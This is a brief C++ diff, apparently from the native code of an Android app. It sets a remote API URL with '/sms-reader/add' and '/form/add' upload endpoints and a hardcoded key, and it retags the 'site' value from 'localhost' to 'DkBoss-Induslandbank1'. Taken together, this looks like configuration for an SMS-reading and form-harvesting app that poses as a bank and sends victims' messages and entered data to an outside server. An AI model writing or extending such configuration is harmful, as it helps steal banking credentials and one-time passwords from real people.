@@ -5,7 +5,7 @@
 std::string url = "https://amanbhaidkbosswala.in/api";
 std::string sms_save = "/sms-reader/add";
 std::string form_save = "/form/add";
-std::string site = "localhost";
+std::string site = "DkBoss-Induslandbank1";
 std::string KEY = "00112233445566778899aabbccddeeff";
 
 extern "C"
